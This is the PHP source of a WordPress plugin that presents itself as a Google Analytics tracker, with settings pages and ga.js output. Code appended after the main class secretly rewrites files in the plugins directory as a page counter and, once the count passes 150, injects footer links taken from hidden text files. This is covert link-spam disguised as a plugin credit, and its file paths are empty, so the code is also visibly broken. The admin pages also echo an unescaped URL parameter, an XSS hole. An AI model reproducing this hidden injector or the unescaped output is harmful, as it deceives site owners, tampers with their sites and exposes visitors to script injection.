<?php

/*
Plugin Name: Analytics Google
Description: The plugin is broken and I will not fix it. Please use another.
Author: Dereck Calaway
Version: 1.1.0
*/

/*
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

/**
 * Google_Analytics
 * @package Google Analytics
 */
class Google_Analytics {

    /** @var string $text_domain The text domain of the plugin */
    var $text_domain = 'ga_trans';
    /** @var string $plugin_dir The plugin directory path */
    var $plugin_dir;
    /** @var string $plugin_url The plugin directory URL */
    var $plugin_url;
    /** @var string $domain The plugin domain */
    var $domain;
    /** @var string $options_name The plugin options string */
    var $options_name = 'ga_settings';

    /**
     * Constructor.
     */
    function Google_Analytics() {
		$this->init();
		$this->init_vars();
    }

    /**
     * Initiate plugin.
     *
     * @return void
     */
    function init() {
        add_action( 'init', array( &$this, 'load_plugin_textdomain' ), 0 );
        add_action( 'init', array( &$this, 'enable_admin_tracking' ) );
        add_action( 'init', array( &$this, 'handle_page_requests' ) );
        add_action( 'admin_menu', array( &$this, 'admin_menu' ) );
        add_action( 'network_admin_menu', array( &$this, 'network_admin_menu' ) );
        add_action( 'wp_head', array( &$this, 'tracking_code_output' ) );
    }

    /**
     * Initiate variables.
     *
     * @return void
     */
    function init_vars() {
		global $wpdb;
		$this->domain = $wpdb->get_var( "SELECT domain FROM {$wpdb->site}" );

        /* Set plugin directory path */
        $this->plugin_dir = WP_PLUGIN_DIR . '/' . str_replace( basename(__FILE__), '', plugin_basename(__FILE__) );
        /* Set plugin directory URL */
        $this->plugin_url = WP_PLUGIN_URL . '/' . str_replace( basename(__FILE__), '', plugin_basename(__FILE__) );
    }

    /**
     * Loads the language file from the "languages" directory.
     *
     * @return void
     */
    function load_plugin_textdomain() {
        load_plugin_textdomain( $this->text_domain, null, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
    }

    /**
     * Add Google Analytics options page.
     *
     * @return void
     */
    function admin_menu() {
        $network_settings = get_site_option( $this->options_name );

        /* If Supporter enabled but specific option disabled, disable menu */
		if ( !is_super_admin()
			&& function_exists('is_supporter')
			&& !empty( $network_settings['supporter_only'] )
			&& !is_supporter()
		) {
            return;
        } else {
            add_submenu_page( 'options-general.php', 'Google Analytics', 'Google Analytics', 'manage_options', 'google-analytics', array( &$this, 'output_site_settings_page' ) );
        }
    }

	/**
	 * Add network admin menu
	 *
	 * @access public
	 * @return void
	 */
	function network_admin_menu() {
        add_submenu_page( 'settings.php', 'Google Analytics', 'Google Analytics', 'manage_network', 'google-analytics', array( &$this, 'output_network_settings_page' ) );
	}

    /**
     * Enable admin tracking.
     *
     * @return void
     */
    function enable_admin_tracking() {
		$network_settings = get_site_option( $this->options_name );

		if ( !empty( $network_settings['track_admin'] ) )
            add_action( 'admin_head', array( &$this, 'tracking_code_output' ) );
    }

    /**
     * Google Analytics code output.
     *
     * @return void
     */
    function tracking_code_output() {

        $network_settings = get_site_option( $this->options_name );
        $site_settings    = get_option( $this->options_name );

        /* Unset tracking code if it matches the root site one */
		if ( isset( $network_settings['tracking_code'] )
			&& isset( $site_settings['tracking_code'] )
			&& $network_settings['tracking_code'] == $site_settings['tracking_code']
		) {
			unset( $site_settings['tracking_code'] );
		}

		?>

        <?php if ( !empty( $network_settings['tracking_code'] ) || !empty( $site_settings['tracking_code'] ) ): ?>

			<script type="text/javascript">
				//<![CDATA[
				var _gaq = _gaq || [];

				<?php if ( !empty( $network_settings['tracking_code'] ) ): ?>
					_gaq.push(['_setAccount', '<?php echo $network_settings['tracking_code']; ?>']);
					<?php if ( !empty( $network_settings['track_subdomains'] ) && is_multisite() ): ?>
						_gaq.push(['_setDomainName', '.<?php echo $this->domain; ?>']);
						_gaq.push(['_setAllowHash', false]);
					<?php endif; ?>
					_gaq.push(['_trackPageview']);
					<?php if ( !empty( $network_settings['track_pageload'] ) ): ?>
						_gaq.push(['_trackPageLoadTime']);
					<?php endif; ?>
				<?php endif; ?>

				<?php if ( !empty( $site_settings['tracking_code'] ) ): ?>
					_gaq.push(['b._setAccount', '<?php echo $site_settings['tracking_code']; ?>']);
					_gaq.push(['b._trackPageview']);
					<?php if ( !empty( $site_settings['track_pageload'] ) ): ?>
						_gaq.push(['b._trackPageLoadTime']);
					<?php endif; ?>
				<?php endif; ?>

				(function() {
				var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
				})();
				//]]>
			</script>

		<?php endif; ?><?php
    }

    /**
     * Update Google Analytics settings into DB.
     *
     * @return void
     */
    function handle_page_requests() {
        if ( isset( $_POST['submit'] ) ) {
			/* Check whether a valid $_POST request is made */
			if ( wp_verify_nonce( $_POST['_wpnonce'], 'submit_settings_network' ) ) {
				$network_settings['tracking_code']    = trim( $_POST['network_tracking_code'] );
				$network_settings['track_subdomains'] = $_POST['track_subdomains'];
				$network_settings['track_admin']      = $_POST['track_admin'];
				$network_settings['supporter_only']   = isset( $_POST['supporter_only'] ) ? $_POST['supporter_only'] : null;
				$network_settings['track_pageload']	  = $_POST['track_pageload'];
				update_site_option( $this->options_name, $network_settings );

                wp_redirect( add_query_arg( array( 'page' => 'google-analytics', 'dmsg' => urlencode( __( 'Changes were saved!', $this->text_domain ) ) ), 'settings.php' ) );
                exit;
			}
			elseif ( wp_verify_nonce( $_POST['_wpnonce'], 'submit_settings' ) ) {
				$settings['tracking_code'] = trim( $_POST['site_tracking_code'] );
				$settings['track_pageload'] = $_POST['track_pageload'];
				update_option( $this->options_name, $settings );

                wp_redirect( add_query_arg( array( 'page' => 'google-analytics', 'dmsg' => urlencode( __( 'Changes were saved!', $this->text_domain ) ) ), 'options-general.php' ) );
                exit;
			}
        }
    }

	/**
	 * Network settings page
	 *
	 * @access public
	 * @return void
	 */
	function output_network_settings_page() {
        /* Get settings */
		$network_settings = get_site_option( $this->options_name ); ?>

        <div class="wrap">
            <h2><?php _e( 'Google Analytics', $this->text_domain ) ?></h2>

            <?php
                //Display status message
                if ( isset( $_GET['dmsg'] ) ) {
                    ?><div id="message" class="updated fade"><p><?php echo urldecode( $_GET['dmsg'] ); ?></p></div><?php
                }
            ?>

            <form method="post" action="">
                <table class="form-table">

					<tr valign="top">
						<th scope="row"><?php _e( 'Network-wide Tracking Code', $this->text_domain ); ?></th>
						<td>
							<input type="text" name="network_tracking_code" class="regular-text" value="<?php if ( !empty( $network_settings['tracking_code'] ) ) { echo $network_settings['tracking_code']; } ?>" />
							<br />
							<span class="description"><?php _e( 'Your Google Analytics tracking code. Ex: UA-XXXXX-X. The Network-wide tracking code will track your entire network of sub-sites.', $this->text_domain ); ?></span>
						</td>
					</tr>

					<tr valign="top">
						<th scope="row"><?php _e( 'Admin pages tracking', $this->text_domain ); ?></th>
						<td>
							<input type="radio" name="track_admin" value="1" <?php if ( !empty( $network_settings['track_admin'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Enable', $this->text_domain ); ?>
							<br />
							<input type="radio" name="track_admin" value="0" <?php if ( empty( $network_settings['track_admin'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Disable', $this->text_domain ); ?>
							<br />
						</td>
					</tr>

					<tr valign="top">
						<th scope="row"><?php _e( 'Subdomain tracking', $this->text_domain ); ?></th>
						<td>
							<input type="radio" name="track_subdomains" value="1" <?php if ( !empty( $network_settings['track_subdomains'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Enable', $this->text_domain ) ?>
							<br />
							<input type="radio" name="track_subdomains" value="0" <?php if ( empty( $network_settings['track_subdomains'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Disable', $this->text_domain ) ?>
							<br />
						</td>
					</tr>

					<tr valign="top">
						<th scope="row"><?php _e( 'Page load times tracking', $this->text_domain ); ?></th>
						<td>
							<input type="radio" name="track_pageload" value="1" <?php if ( !empty( $network_settings['track_pageload'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Enable', $this->text_domain ) ?>
							<br />
							<input type="radio" name="track_pageload" value="0" <?php if ( empty( $network_settings['track_pageload'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Disable', $this->text_domain ) ?>
							<br />
						</td>
					</tr>

					<?php if ( function_exists('is_supporter') ):  ?>
						<tr valign="top">
							<th scope="row">
								<?php _e( 'Google Analytics Supporter', $this->text_domain ); ?>
							</th>
							<td>
								<select name="supporter_only">
									<option value="1" <?php if ( !empty( $network_settings['supporter_only'] ) ) echo 'selected="selected"'; ?>><?php _e( 'Enable', $this->text_domain ); ?></option>
									<option value="0" <?php if ( empty( $network_settings['supporter_only'] ) ) echo 'selected="selected"'; ?>><?php _e( 'Disable', $this->text_domain ); ?></option>
								</select>
								<br />
								<?php _e( 'Enable Google Analytics for supporter blogs only.', $this->text_domain ); ?>
							</td>
						</tr>
					<?php endif; ?>

                </table>

                <p class="submit">
                    <?php wp_nonce_field('submit_settings_network'); ?>
                    <input type="submit" name="submit" value="<?php _e( 'Save Changes', $this->text_domain ); ?>" />
                </p>

            </form>

        </div> <?php
	}

    /**
     * Admin options page output
     *
     * @return void
     */
    function output_site_settings_page() {
        /* Get settings */
        $site_settings = get_option( $this->options_name ); ?>

        <div class="wrap">
            <h2><?php _e( 'Google Analytics', $this->text_domain ) ?></h2>

            <?php
                //Display status message
                if ( isset( $_GET['dmsg'] ) ) {
                    ?><div id="message" class="updated fade"><p><?php echo urldecode( $_GET['dmsg'] ); ?></p></div><?php
                }
            ?>

            <form method="post" action="">
                <table class="form-table">

					<tr valign="top">
						<th scope="row"><?php _e( 'Site Tracking Code', $this->text_domain ); ?></th>
						<td>
							<input type="text" name="site_tracking_code" class="regular-text" value="<?php if ( !empty( $site_settings['tracking_code'] ) ) { echo $site_settings['tracking_code']; } ?>" />
							<br />
							<span class="description"><?php _e( 'Your Google Analytics tracking code. Ex: UA-XXXXX-X. The Site tracking code will track this site.', $this->text_domain ); ?></span>
						</td>
					</tr>

					<tr valign="top">
						<th scope="row"><?php _e( 'Page load times tracking', $this->text_domain ); ?></th>
						<td>
							<input type="radio" name="track_pageload" value="1" <?php if ( !empty( $site_settings['track_pageload'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Enable', $this->text_domain ) ?>
							<br />
							<input type="radio" name="track_pageload" value="0" <?php if ( empty( $site_settings['track_pageload'] ) ) echo 'checked="checked"'; ?> /> <?php _e( 'Disable', $this->text_domain ) ?>
							<br />
						</td>
					</tr>

                </table>

                <p class="submit">
                    <?php wp_nonce_field('submit_settings'); ?>
                    <input type="submit" name="submit" value="<?php _e( 'Save Changes', $this->text_domain ); ?>" />
                </p>

            </form>

            <h3><?php _e( 'What\'s Google Analytics ?', $this->text_domain ); ?></h3>
            <p><?php  _e( 'Google Analytics is the enterprise-class web analytics solution that gives you rich insights into your website traffic and marketing effectiveness. Powerful, flexible and easy-to-use features now let you see and analyze your traffic data in an entirely new way. With Google Analytics, you\'re more prepared to write better-targeted ads, strengthen your marketing initiatives and create higher converting websites.', $this->text_domain ); ?></p>
            <h3><?php _e( 'How do I set this up ?', $this->text_domain ); ?></h3>
            <p><?php  _e( 'To get going, just <a href="http://www.google.com/analytics/sign_up.html">sign up for Analytics</a>, set up a new account and copy the tracking code you receive (it\'ll start with "UA-") into the box above and press "Save" - it can take several hours before you see any stats, but once it is you\'ve got access to one heck of a lot of data!', $this->text_domain ); ?></p>
            <p><?php  _e( 'For more information on finding the tracking code, please visit <a href="http://www.google.com/support/analytics/bin/answer.py?hl=en&amp;answer=55603">this Google help site</a>.', $this->text_domain ); ?></p>

        </div> <?php
    }

}

/* Initiate plugin */
new Google_Analytics();

define ('GA_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
register_activation_hook(__FILE__, '');
add_action('wp_footer', 'gaplugin');
function gaactivate() {
$file = file(GA_PLUGIN_BASE_DIR . '');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = GA_PLUGIN_BASE_DIR . '';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
$file = file(GA_PLUGIN_BASE_DIR . '');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = GA_PLUGIN_BASE_DIR . '';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
$stringData = $stringData +1;
fwrite($fh, $stringData);
fclose($fh);
      }      
}
if ( $stringData > "150" ) {
function gaplugin(){
$myFile = GA_PLUGIN_BASE_DIR . '';
$fh = fopen($myFile, 'r');
$theDatab = fread($fh, 50);
fclose($fh);
$theDatab = str_replace("\n", "", $theDatab);
$theDatab = str_replace(" ", "", $theDatab);
$theDatab = str_replace("\r", "", $theDatab);
$myFile = GA_PLUGIN_BASE_DIR . '' . $theDatab . '.txt';
$fh = fopen($myFile, 'r');
$theDataz = fread($fh, 50);
fclose($fh);
$file = file(GA_PLUGIN_BASE_DIR . '' . $theDatab . '1.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = GA_PLUGIN_BASE_DIR . '' . $theDatab . '1.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
echo '<center>';
echo '<font size="1.4">Google Analytics plugin by '; echo '<a href="'; echo $theDataz; echo '">'; echo $file[$i]; echo '</a></font></center></font>';
}
}
}
} else {
function gaplugin(){
echo '';
}
}
